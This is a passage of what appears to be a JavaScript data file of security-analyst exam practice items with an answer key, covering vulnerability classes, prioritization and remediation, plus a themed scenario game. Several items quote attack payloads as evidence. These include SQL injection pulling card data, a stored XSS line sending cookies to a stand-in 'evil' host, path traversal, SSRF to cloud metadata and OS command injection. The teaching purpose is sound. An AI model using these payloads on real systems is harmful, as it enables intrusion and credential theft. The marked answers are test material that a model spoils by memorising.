{ s: "A CSPM tool flags several cloud issues overnight.", e: "Findings: public DB endpoint, unused access keys 400+ days old, security group 0.0.0.0/0 on 3389", q: "Which should be treated as highest exposure?", options: [
 { t: "The internet-open RDP (3389 to 0.0.0.0/0) and public database endpoint -- direct external reachability to sensitive services", c: true, w: "Externally reachable management/data services are immediate, high-exposure risks attackers actively scan for." },
 { t: "The unused access keys, purely because they're old", c: false, w: "Stale keys matter (rotate/remove them), but open RDP and a public DB are directly exploitable now." },
 { t: "None; CSPM findings are advisory only", c: false, w: "CSPM surfaces real, exploitable cloud exposures." },
 { t: "All are equally low priority in cloud", c: false, w: "Externally reachable sensitive services are high priority anywhere." } ] },
{ s: "Leadership wants to reduce attack surface with one systemic action.", e: "Environment: many hosts run services nobody uses", q: "Strongest single control:", options: [
 { t: "Disable/remove unused services and close unneeded ports across the fleet", c: true, w: "Turning off what you don't need eliminates whole classes of exposure -- the strongest control for an unused service." },
 { t: "Add more monitoring to the unused services", c: false, w: "Monitoring an unnecessary service is weaker than removing it entirely." },
 { t: "Buy a bigger firewall", c: false, w: "Hardware doesn't fix services that shouldn't be running in the first place." },
 { t: "Increase scan frequency only", c: false, w: "Scanning finds the surface; it doesn't reduce it." } ] },
{ s: "An analyst reviews cloud audit logs after a posture alert.", e: "Fields available: principal, action, resource, region, sourceIP, userAgent, result", q: "What's the analytic value of reading these fields together?", options: [
 { t: "They reconstruct who did what to which resource, from where, and whether it succeeded -- the basis for spotting misuse", c: true, w: "Correlating principal/action/resource/source/result is how you detect suspicious cloud activity and misconfiguration abuse." },
 { t: "Only 'result' matters; ignore the rest", c: false, w: "Context (who, what, where) is essential to judge whether a successful action was legitimate." },
 { t: "Cloud logs can't identify the actor", c: false, w: "The principal field identifies the acting identity." },
 { t: "These fields are irrelevant to vulnerability management", c: false, w: "Cloud posture and exposure analysis rely directly on audit-log interpretation." } ] },
{ s: "A pre-production review wants to shrink external attack surface before launch.", e: "App exposes: admin panel, API, health endpoint, and a debug console -- all public", q: "Best hardening action:", options: [
 { t: "Restrict the admin panel and debug console to internal/VPN access and remove debug from production; expose only what must be public", c: true, w: "Minimizing internet-facing entry points (especially admin/debug) is core attack-surface reduction." },
 { t: "Leave everything public but add a login page to the debug console", c: false, w: "A public debug console is a needless high-risk surface; restrict or remove it." },
 { t: "Publish all endpoints and rely on obscurity", c: false, w: "Security through obscurity for admin/debug endpoints is not a control." },
 { t: "Expose more endpoints for flexibility", c: false, w: "That expands attack surface, the opposite of the goal." } ] } ],

"cysa-vuln-5": [
{ s: "A web request appears in the proxy log.", e: "GET /items?id=9 UNION SELECT card_no,cvv FROM payments--", q: "What is this, and the durable fix?", options: [
 { t: "SQL injection; fix with parameterized queries/prepared statements and least-privilege DB accounts", c: true, w: "The UNION SELECT appends attacker SQL; parameterization is the root-cause remediation, not just input filtering." },
 { t: "Cross-site scripting; fix with output encoding", c: false, w: "This targets the database, not the browser -- it's SQLi, not XSS." },
 { t: "Path traversal; fix by validating file paths", c: false, w: "No directory escape here; it's a database injection." },
 { t: "A false positive; UNION is a normal keyword", c: false, w: "UNION SELECT against a payments table in a URL parameter is a live injection attempt." } ] },
{ s: "A logged-in user changes a URL parameter and sees another customer's invoice.", e: "GET /invoice?id=4471 (theirs) -> change to 4472 -> 200 OK, someone else's data", q: "This vulnerability class is:", options: [
 { t: "Insecure Direct Object Reference (broken access control); enforce server-side authorization on every object request", c: true, w: "Accessing another's object by ID manipulation is IDOR; the fix is per-request server-side authz checks." },
 { t: "SQL injection", c: false, w: "No query manipulation -- just an unauthorized object accessed via ID swap." },
 { t: "Denial of service", c: false, w: "Availability isn't affected; this is unauthorized data access." },
 { t: "A CSRF attack", c: false, w: "CSRF forces actions via the victim's browser; here the attacker directly requests another's object." } ] },
{ s: "A server-side feature fetches a URL supplied by the user.", e: "POST /fetch  body: url=http://169.254.169.254/latest/meta-data/iam/", q: "What attack is this, and why is the target notable?", options: [
 { t: "SSRF; the cloud metadata endpoint can leak instance credentials, so block internal/metadata targets and validate the URL", c: true, w: "SSRF to 169.254.169.254 is a classic cloud credential-theft vector; restrict server-initiated requests to internal addresses." },
 { t: "XSS targeting the browser", c: false, w: "The server makes the request, not a victim browser -- it's SSRF, not XSS." },
 { t: "SQL injection against metadata", c: false, w: "No SQL involved; it's a forged server-side request." },
 { t: "Harmless; that IP is unroutable externally", c: false, w: "That's exactly why it's dangerous -- the server can reach it even though outsiders can't." } ] },
{ s: "A team deploys a WAF to block a SQL injection flaw they can't immediately fix in code.", e: "WAF rule signatures now block the payload", q: "How should this be characterized?", options: [
 { t: "A mitigation / virtual patch that buys time; the vulnerable code still needs remediation", c: true, w: "A WAF reduces exploitability but the underlying flaw remains -- code fix is the real remediation." },
 { t: "Full remediation; the vulnerability is gone", c: false, w: "The code is still vulnerable; WAF bypasses exist. It's mitigation, not a fix." },
 { t: "Risk acceptance", c: false, w: "Deploying a control is mitigation, not acceptance." },
 { t: "A false positive suppression", c: false, w: "The flaw is real; the WAF is compensating for it." } ] },
{ s: "Log review shows repeated requests with ../ sequences.", e: "GET /download?file=../../../../etc/passwd", q: "Identify the attack and the fix:", options: [
 { t: "Path/directory traversal; canonicalize and validate the path, restrict to an allowlisted directory, and run least privilege", c: true, w: "The ../ escapes the intended folder; canonicalization plus allowlisting is the fix." },
 { t: "SQL injection; parameterize queries", c: false, w: "No SQL -- this is filesystem traversal." },
 { t: "SSRF; block metadata endpoints", c: false, w: "No outbound server request; it's local file access via traversal." },
 { t: "A benign file download", c: false, w: "Requesting /etc/passwd via ../ is a clear traversal attempt." } ] },
{ s: "A dependency scan (SCA) flags a vulnerable version of a widely used library in the app.", e: "log4j-style transitive dependency, vulnerable version, exploit available", q: "Best action?", options: [
 { t: "Upgrade the library to a fixed version (remediate the dependency); if blocked, apply virtual patching/WAF and monitor", c: true, w: "Vulnerable dependencies are remediated by upgrading; SCA exists to surface exactly these transitive risks." },
 { t: "Ignore it because it's a third-party library, not your code", c: false, w: "Transitive dependencies run in your app and are your risk to remediate." },
 { t: "Rewrite the library from scratch", c: false, w: "Disproportionate; upgrading to the patched version is the standard fix." },
 { t: "Disable all logging permanently", c: false, w: "Overbroad; the fix is upgrading the vulnerable component." } ] },
{ s: "A stored value submitted by one user later executes script in an admin's browser.", e: "Comment field stored: <script>fetch('//evil/'+document.cookie)</script>", q: "Classify and remediate:", options: [
 { t: "Stored XSS; apply output encoding on render and a Content Security Policy", c: true, w: "Persisted script running in other users' browsers is stored XSS; encoding output and CSP are the controls." },
 { t: "Reflected XSS only", c: false, w: "The payload is stored and later served to others -- stored, not reflected." },
 { t: "SQL injection", c: false, w: "It executes in the browser, not the database -- XSS, not SQLi." },
 { t: "CSRF", c: false, w: "This runs attacker script in a victim's session; CSRF forges requests without script injection." } ] },
{ s: "Two findings need classification for the report.", e: "Finding 1: ' OR '1'='1 in a login field bypasses auth\nFinding 2: user swaps account_id to view others' records", q: "Correct classifications:", options: [
 { t: "1 = SQL injection (auth bypass); 2 = broken access control / IDOR", c: true, w: "Boolean SQLi bypasses the login query; ID swapping is an access-control failure -- two distinct classes." },
 { t: "Both are SQL injection", c: false, w: "The ID swap involves no query manipulation; it's broken access control." },
 { t: "Both are broken access control", c: false, w: "The ' OR '1'='1 payload is a SQL injection technique." },
 { t: "1 = XSS; 2 = SSRF", c: false, w: "Neither classification fits; 1 is SQLi, 2 is IDOR." } ] } ],
},
pbqs: [
{ type: "order", s: "A new vulnerability program run produces raw scan output.", task: "Order the vulnerability management lifecycle steps:",
 steps: ["Discover and inventory assets in scope", "Scan (credentialed where possible)", "Validate findings and remove false positives", "Prioritize by risk (severity x exploitability x exposure x asset value)", "Remediate or apply compensating controls", "Rescan to validate remediation and report"],
 x: "You can't scan what you haven't inventoried; validate before prioritizing; prioritize before remediating; and always re-test to confirm the fix. Reporting closes the loop." },
{ type: "order", s: "A critical, actively exploited CVE lands on a production web server.", task: "Order the response for a KEV-listed finding on a live asset:",
 steps: ["Confirm the finding applies (validate, not a false positive)", "Assess exposure and asset criticality", "Apply an immediate compensating control (e.g., WAF virtual patch)", "Schedule and apply the vendor patch in a change window", "Rescan to verify remediation", "Update the report and close with evidence"],
 x: "Validate first, gauge exposure, buy time with a virtual patch on an exploited flaw, then remediate properly and verify. Immediate mitigation before the maintenance window is the KEV-driven move." },
{ type: "match", s: "Classify each risk response.", task: "Match each action to the risk response it represents:",
 cats: ["Remediate", "Mitigate", "Accept", "Transfer"],
 items: [
  { t: "Install the vendor patch that fixes the root cause", c: "Remediate" },
  { t: "Segment an unpatchable device and add IPS virtual patching", c: "Mitigate" },
  { t: "Risk owner signs off to tolerate a low-impact flaw with a review date", c: "Accept" },
  { t: "Purchase cyber-insurance to cover potential breach losses", c: "Transfer" },
  { t: "Rewrite the vulnerable code with parameterized queries", c: "Remediate" },
  { t: "Add monitoring and access restrictions while awaiting a fix", c: "Mitigate" } ],
 x: "Remediate fixes the root cause; mitigate reduces risk without a full fix; accept is a governed tolerate-decision; transfer shifts financial impact elsewhere." },
{ type: "match", s: "Match each scan type to its best-fit scenario.", task: "Assign the right scanning approach:",
 cats: ["Credentialed", "Uncredentialed", "Agent-based", "Passive"],
 items: [
  { t: "Deep, accurate patch-level assessment of a managed server", c: "Credentialed" },
  { t: "See what an external attacker sees on an exposed host", c: "Uncredentialed" },
  { t: "Roaming laptops rarely on the corporate network", c: "Agent-based" },
  { t: "Zero-footprint asset discovery on fragile OT segment", c: "Passive" },
  { t: "Autoscaling cloud instances that come and go", c: "Agent-based" } ],
 x: "Credentialed = depth; uncredentialed = attacker view; agent-based = intermittent/ephemeral hosts; passive = zero-touch discovery on fragile networks." },
{ type: "match", s: "Map each web finding to its vulnerability class.", task: "Classify each observation:",
 cats: ["Injection", "Broken Access Control", "SSRF", "XSS"],
 items: [
  { t: "' OR '1'='1 bypasses the login", c: "Injection" },
  { t: "Changing ?id=1001 to 1002 returns another user's record", c: "Broken Access Control" },
  { t: "Stored <script> runs in an admin's browser", c: "XSS" },
  { t: "Server fetches http://169.254.169.254/ on user request", c: "SSRF" },
  { t: "; whoami appended to a parameter runs an OS command", c: "Injection" },
  { t: "../../etc/passwd retrieved via a download parameter", c: "Broken Access Control" } ],
 x: "Injection (SQL/OS) manipulates commands; IDOR and path traversal are broken access control; script in others' browsers is XSS; server-forged requests are SSRF." },
{ type: "multi", s: "A remediation plan is under change-board review.", e: "System: 24/7 core database cluster\nPatch: requires service restart", q: "Select ALL elements a complete remediation plan must include:",
 options: [
  { t: "A scheduled maintenance window (or failover) to limit business impact", c: true, w: "Downtime must be planned around business tolerance." },
  { t: "A tested rollback/backout plan", c: true, w: "You need a safe path back if the patch fails." },
  { t: "Verified backups before applying the change", c: true, w: "Backups enable recovery and safe rollback." },
  { t: "Post-patch validation (rescan / functional test)", c: true, w: "Unverified remediation can't be counted as done." },
  { t: "Skipping documentation to move faster", c: false, w: "Change records and evidence are required, not optional." } ],
 x: "Remediation is change management: window, rollback, backups, and validation -- all documented. Speed is never a reason to drop the safety steps." },
{ type: "multi", s: "You must reprioritize a CVSS-only queue by real risk.", e: "Four findings, all CVSS 8.0:\nA) internet-facing, on CISA KEV\nB) internal, EPSS 0.90\nC) isolated lab, no known exploit\nD) internet-facing payment app, EPSS 0.75", q: "Select ALL findings that should rank ABOVE the isolated lab box (C):",
 options: [
  { t: "A -- internet-facing and actively exploited (KEV)", c: true, w: "Exposure + confirmed exploitation makes A urgent." },
  { t: "B -- high near-term exploitation probability (EPSS 0.90)", c: true, w: "High EPSS elevates it above an unexploited isolated host." },
  { t: "D -- internet-facing, high EPSS, critical asset", c: true, w: "Exposure, exploitability, and asset value all push D up." },
  { t: "C should rank at the top because it's isolated", c: false, w: "Isolation lowers risk; C belongs at the bottom of these four." },
  { t: "None; equal CVSS means equal priority", c: false, w: "Equal severity is exactly when exploitability and exposure decide order." } ],
 x: "With identical CVSS, the tie-breakers are exposure, exploitability (KEV/EPSS), and asset value -- the isolated, unexploited box ranks last." },
{ type: "multi", s: "A legacy OT controller has a critical CVE and no available patch.", e: "Vendor EOL; controller runs a production line; cannot be modified per contract", q: "Select ALL appropriate compensating controls:",
 options: [
  { t: "Network segmentation / isolation into a restricted VLAN", c: true, w: "Limits who can reach the vulnerable device." },
  { t: "Allowlist access to a single management host", c: true, w: "Minimizes the exposure to one controlled path." },
  { t: "IPS/WAF virtual patching for the specific CVE", c: true, w: "Blocks known exploit traffic without touching the device." },
  { t: "Enhanced monitoring/logging around the device", c: true, w: "Improves detection while the flaw remains." },
  { t: "Ignore the finding since it can't be patched", c: false, w: "Inhibitors require compensating controls, not abandonment." } ],
 x: "When patching is impossible, layer segmentation, access restriction, virtual patching, and monitoring to reduce exploitability." },
{ type: "order", s: "A scanner reports a critical finding a sysadmin believes is wrong.", task: "Order the false-positive validation workflow:",
 steps: ["Review the finding's evidence and affected software/OS", "Compare against the asset's actual installed versions/config", "Check for back-ported patches or environment context", "Manually verify or use a second data source", "Mark false positive (with justification) or confirm and prioritize"],
 x: "Validate against reality before acting: read the evidence, compare to what's installed, account for back-ports, corroborate, then dispose with documentation." },
{ type: "multi", s: "You're building the prioritization model for the program.", e: "Available signals per finding: CVSS base, EPSS, CISA KEV status, internet exposure, asset business value", q: "Select ALL signals that SHOULD raise a finding's priority:",
 options: [
  { t: "Presence on the CISA KEV catalog", c: true, w: "Confirmed active exploitation is a strong urgency signal." },
  { t: "High EPSS score", c: true, w: "High near-term exploitation probability raises priority." },
  { t: "Internet-facing exposure", c: true, w: "Reachability by attackers increases real risk." },
  { t: "High business value / crown-jewel asset", c: true, w: "Impact of compromise scales priority." },
  { t: "Being on an isolated, offline network", c: false, w: "Isolation lowers exposure and therefore priority." } ],
 x: "Risk-based prioritization stacks exploitability (KEV/EPSS), exposure, and asset value on top of severity; isolation reduces, not raises, priority." },
],
boss: {
 title: "Operation Hull Breach: The Grubs' Catalog",
 brief: "Zurg's Grubs have finished cataloging Star Command's weaknesses and beamed the list to the fleet -- 2,000 findings, and they're drilling the hull where it's thinnest. You have the vulnerability console and five decisions. Prioritize by real risk, Ranger, or you'll patch a closet while the reactor room floods.",
 win: "The Grubs' catalog is worthless -- the exploited, exposed holes were sealed first, the unpatchable ones walled off, every fix verified. They scuttle back to Planet Z empty-handed. Domain mission cleared.",
 lose: "The Grubs found an open hole you left for later -- one that was exposed and already being drilled. Review which findings you ranked by raw score instead of real risk, and deploy again.",
 stages: [
 { sit: "The catalog hits: 2,000 findings sorted by CVSS descending. The Grubs are already probing something. Fleet Ops wants a plan in ten minutes.",
  e: "Top of queue (CVSS 9.8): internal isolated lab VM, no known exploit\nBuried at #340 (CVSS 7.5): internet-facing payment gateway, on CISA KEV, EPSS 0.88\n#12 (CVSS 9.4): dev sandbox, air-gapped",
  options: [
  { t: "Re-sort by real risk -- pull the KEV-listed internet-facing 7.5 to the top over the isolated 9.8s", d: 0, r: 4, ev: 0, ql: "best", w: "Severity isn't risk. An exploited, exposed, business-critical 7.5 outranks isolated 9.8s every time -- this is the whole domain in one call." },
  { t: "Work strictly top-down by CVSS so the record shows the criticals first", d: 20, r: -5, ev: 0, ql: "bad", w: "The Grubs are drilling the exposed 7.5 while you patch an air-gapped lab box. CVSS-only ordering is the trap they're counting on." },
  { t: "Patch all CVSS 9.0+ before touching anything lower", d: 16, r: -4, ev: 0, ql: "bad", w: "An arbitrary severity cutoff leaves the actively exploited, internet-facing 7.5 open -- exactly the hole being drilled." } ]},
 { sit: "You reach the payment gateway finding. It's real, exploited, and internet-facing -- but the vendor patch needs a maintenance window the business won't grant until the weekend.",
  e: "CVE confirmed applies (validated) | KEV-listed | EPSS 0.88\nPatch requires 20-min restart | business blocks downtime until Saturday\nWAF sits in front of the gateway",
  options: [
  { t: "Deploy a WAF virtual patch now to blunt exploitation, then apply the vendor patch in Saturday's window and rescan", d: 0, r: 3, ev: 2, ql: "best", w: "On an exploited, exposed flaw you can't patch yet, a virtual patch buys time; the real fix still lands in the window, then you verify." },
  { t: "Force the restart now during business hours -- it's KEV, downtime be damned", d: 10, r: -4, ev: 0, ql: "ok", w: "Urgency is right, but causing an unplanned payment outage when a WAF virtual patch would hold is a heavy-handed call." },
  { t: "Wait until Saturday with no interim control", d: 22, r: -6, ev: 0, ql: "bad", w: "Leaving an actively exploited internet-facing gateway open for days with no mitigation is how the breach happens." } ]},
 { sit: "The Grubs pivot to an old manufacturing controller. Critical CVE, but it's end-of-life with no patch and a contract that forbids modifying it.",
  e: "Legacy SCADA controller | vendor EOL, no fix | MSA bars customer changes\nRuns a live production line | currently reachable from the plant VLAN",
  options: [
  { t: "Apply compensating controls: isolate into a restricted VLAN, allowlist one management host, IPS virtual-patch the CVE, heighten monitoring", d: 0, r: 3, ev: 1, ql: "best", w: "Unpatchable-by-contract is a classic inhibitor: reduce exploitability with segmentation, access control, and virtual patching instead of a patch." },
  { t: "Accept the risk and move on -- nothing can be done", d: 18, r: -5, ev: 0, ql: "bad", w: "An inhibitor doesn't erase a critical, reachable flaw; 'nothing can be done' ignores every compensating control available." },
  { t: "Yank the controller offline immediately to be safe", d: 12, r: -6, ev: 0, ql: "ok", w: "Killing a live production line is disproportionate when segmentation and virtual patching can contain the risk." } ]},
 { sit: "A scan flags 60 'critical' findings on the fleet's Linux servers. The admin swears they're patched.",
  e: "Findings based on OpenSSH/OpenSSL version banners\nHosts are RHEL with security back-ports applied\nPackage builds show the fixes are present",
  options: [
  { t: "Validate against installed package builds; mark the banner-based findings as false positives with justification", d: 0, r: 2, ev: 3, ql: "best", w: "Back-ported fixes keep the version string but patch the flaw; validating against package data clears the false positives cleanly." },
  { t: "Patch all 60 again immediately to be sure", d: 8, r: -3, ev: 0, ql: "ok", w: "Re-patching already-fixed hosts wastes a maintenance window and change-risk on false positives." },
  { t: "Escalate all 60 to leadership as critical exposures", d: 12, r: -5, ev: -4, ql: "bad", w: "Escalating unvalidated banner false positives as criticals is exactly the noise that erodes trust in the program." } ]},
 { sit: "The Grubs retreat. Leadership wants the remediation report and assurance the fixes actually held.",
  e: "Actions taken: reprioritized by risk, virtual-patched + patched the gateway,\nsegmented the SCADA box, cleared 60 false positives\nOutstanding: confirm the gateway patch took effect",
  options: [
  { t: "Rescan the remediated assets to verify, then report by business risk with metrics (exposure closed, exceptions logged with expiry)", d: 0, r: 4, ev: 0, ql: "best", w: "Validation closes the loop -- unverified fixes don't count -- and risk-framed metrics with tracked exceptions is exactly what leadership needs." },
  { t: "Report 'all patched' without rescanning", d: 12, r: -5, ev: 0, ql: "bad", w: "The gateway patch was never verified; claiming closure you haven't confirmed is how a still-open hole slips through." },
  { t: "Send leadership the raw 2,000-line scanner export", d: 6, r: -4, ev: 0, ql: "bad", w: "A raw dump isn't a report; leadership needs prioritized, risk-framed findings, not unfiltered tool output." } ]},
 ],
},
};
